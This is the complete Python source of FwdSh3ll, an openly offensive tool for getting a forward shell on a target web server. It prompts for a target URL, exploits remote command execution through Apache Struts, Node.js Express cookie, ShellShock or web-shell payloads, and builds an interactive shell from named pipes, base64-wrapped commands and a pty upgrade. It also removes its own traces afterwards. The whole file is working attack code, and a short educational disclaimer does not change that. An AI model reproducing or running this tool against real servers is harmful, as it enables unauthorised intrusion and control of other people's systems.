#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Usage: python3 FwdSh3ll.py [-h]

"""LEGAL DISCLAIMER

FwdSh3ll was written for use in educational purposes only. Using this tool
for attacking web servers without prior mutual consistency can be considered
as an illegal activity. It is the final user's responsibility to obey all
applicable local, state and federal laws.

The author assume no liability and is not responsible for any misuse or
damage caused by this tool.
"""

__author__    = 'Sam Freeside (@snovvcrash)'
__email__     = 'snovvcrash@protonmail[.]ch'
__copyright__ = 'Copyright (C) 2018 Sam Freeside'
__credits__   = ['@ippsec', '@0xdf']

__license__ = 'GPL-3.0'
__date__    = '2018-09-08'
__version__ = '0.2'
__site__    = 'https://github.com/snovvcrash/FwdSh3ll'
__brief__   = 'Forward shell generation framework.'


import urllib3
import threading
import random
import string
import re

import requests

from importlib import import_module
from base64 import b64encode
from time import sleep

from termcolor import colored, cprint

from core.updater import updater
from core.parser import cliOptions
from core.common import BANNER

INPUT = 'fwdshin'
OUTPUT = 'fwdshout'


class ForwardShell:
	def __init__(self, url, proxies, payloadName, genPayload, pipesPath, interval=1.3):
		self._url = url
		self._proxies = proxies
		self._payloadName = payloadName
		self._genPayload = genPayload
		self._interval = interval
		self._delim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

		self._session = random.randrange(10000, 99999)
		self._stdin = f'{pipesPath}/{INPUT}.{self._session}'
		self._stdout = f'{pipesPath}/{OUTPUT}.{self._session}'
		cprint(f'[*] Session path & ID: {pipesPath}/{INPUT}.{self._session}', 'green')

		cprint('[*] Setting up forward shell on target', 'green')
		createNamedPipes = f'mkfifo {self._stdin}; tail -f {self._stdin} | /bin/sh >& {self._stdout}'
		ForwardShell.runRawCmd(createNamedPipes, self._url, self._proxies, self._payloadName, self._genPayload, timeout=0.5, firstConnect=True)

		cprint('[*] Setting up read thread', 'green')
		self._lock = threading.Lock()
		thread = threading.Thread(target=self._readCmd, args=())
		thread.daemon = True
		thread.start()

		cprint('[*] Press CTRL-C to terminate session', 'green')

	def _readCmd(self):
		getOutput = f'/bin/cat {self._stdout}'

		while True:
			result = ForwardShell.runRawCmd(getOutput, self._url, self._proxies, self._payloadName, self._genPayload)

			if result:
				try:
					result = re.search(rf'{self._delim}(.*?){self._delim}', result, re.DOTALL).group(1)
				except AttributeError:
					pass
				else:
					result = result.lstrip()

				with self._lock:
					print(result)

				clearOutput = f'echo -n "" > {self._stdout}'
				ForwardShell.runRawCmd(clearOutput, self._url, self._proxies, self._payloadName, self._genPayload)

			sleep(self._interval)

	@staticmethod
	def runRawCmd(cmd, url, proxies, payloadName, genPayload, timeout=50, firstConnect=False):
		if payloadName == 'ApacheStruts':
			payload = genPayload(cmd)
			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
			cookies = {}
		elif payloadName == 'NodejsExpress':
			payload = genPayload(cmd)
			headers = {'User-Agent': 'Mozilla/5.0'}
			cookies = {'profile': payload}
		elif payloadName == 'ShellShock':
			payload = genPayload(cmd)
			headers = {'User-Agent': payload}
			cookies = {}
		elif payloadName == 'WebShell':
			url += cmd
			headers = {'User-Agent': 'Mozilla/5.0'}
			cookies = {}

		while True:
			page = b''
			try:
				with requests.get(
					url,
					headers=headers,
					cookies=cookies,
					proxies=proxies,
					timeout=timeout,
					verify=False,
					allow_redirects=False,
					stream=True
				) as resp:
					for i in resp.iter_content():
						page += i
				break

			except requests.exceptions.ChunkedEncodingError as e:
				break

			except requests.exceptions.ReadTimeout:
				return None

			except urllib3.exceptions.ConnectTimeoutError:
				cprint('[!] Connection timeout error, retrying', 'yellow')
				if firstConnect:
					firstConnect = False
					continue
				cprint('[-] Connection timeout error', 'yellow')
				return None

			except Exception as e:
				cprint(f'[!] Exception caught: {str(e)}', 'yellow')
				return None

		return page.decode('utf-8')

	def writeCmd(self, cmd, namedPipes=True):
		if namedPipes:
			cmd = f'echo {self._delim};' + cmd + f';echo {self._delim}\n'
			b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
			unwrapAndExec = f'echo {b64Cmd} | base64 -d > {self._stdin}'
		else:
			cmd = f'{cmd}\n'
			b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
			unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh >& /dev/null'

		ForwardShell.runRawCmd(unwrapAndExec, self._url, self._proxies, self._payloadName, self._genPayload)
		sleep(self._interval * 1.2)

	def upgradeToPty(self):
		upgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
		self.writeCmd(upgradeShell, namedPipes=False)


def main():
	print(BANNER)

	args = cliOptions()
	allPayloads = updater()

	print()
	while True:
		url = input(colored('[>] Please enter target URL:  ', 'magenta')).rstrip()
		if url:
			url = url.rstrip()
			break

	proxies = input(colored('[>] Please enter proxies URL (optional):  ', 'magenta'))
	if proxies:
		proxies = proxies.rstrip()
		proxies = {proxies.split('://')[0]: proxies}
	else:
		proxies = {}

	print('\n[?] Which payload you would like to use?\n')

	for i, payloadName in enumerate(allPayloads):
		print(f'    {i + 1}. {payloadName}')

	print()
	while True:
		payloadNum = input(colored('[>] Please enter the number of your choice:  ', 'magenta')).rstrip()
		try:
			payloadNum = int(payloadNum)
			if payloadNum in range(1, len(allPayloads) + 1):
				payloadName = allPayloads[payloadNum - 1]
				payloadModule = import_module('payloads.' + payloadName)
				break
		except ValueError:
			pass

	print('\n[?] Would you like to run a single command or get a forward shell?\n')
	print('    1. Single command')
	print('    2. Forward shell\n')

	while True:
		choice = input(colored('[>] Please enter the number of your choice:  ', 'magenta')).rstrip()

		if choice == '1':
			cprint('\n############################### SINGLE CMD MODE ###############################\n', 'red')
			cmd = input(colored('[>] Please enter the command you would like to execute:  ', 'magenta')).rstrip()
			out = ForwardShell.runRawCmd(cmd, url, proxies, payloadName, payloadModule.genPayload)
			if out is not None:
				print('\n' + out)
			else:
				cprint('[-] An error has occured', 'red')
			break

		elif choice == '2':
			cprint('\n############################## FORWARD SHELL MODE #############################\n', 'red')
			prompt = colored('FwdSh3ll> ', 'magenta')
			sh = ForwardShell(url, proxies, payloadName, payloadModule.genPayload, args.pipes_path)
			print()

			try:
				while True:
					cmd = input(prompt).strip()
					if not cmd:
						continue
					elif cmd == 'pty':
						prompt = ''
						sh.upgradeToPty()
					else:
						sh.writeCmd(cmd)

			except KeyboardInterrupt:
				cprint('\n\n[*] Terminating shell, cleaning up the mess\n', 'green')
				del sh
				cmd = f'rm -f {args.pipes_path}/{INPUT}.* {args.pipes_path}/{OUTPUT}.*\n'
				b64Cmd = b64encode(cmd.encode('utf-8')).decode('utf-8')
				unwrapAndExec = f'echo {b64Cmd} | base64 -d | /bin/sh >& /dev/null'
				ForwardShell.runRawCmd(unwrapAndExec, url, proxies, payloadName, payloadModule.genPayload)
				break


if __name__ == '__main__':
	main()
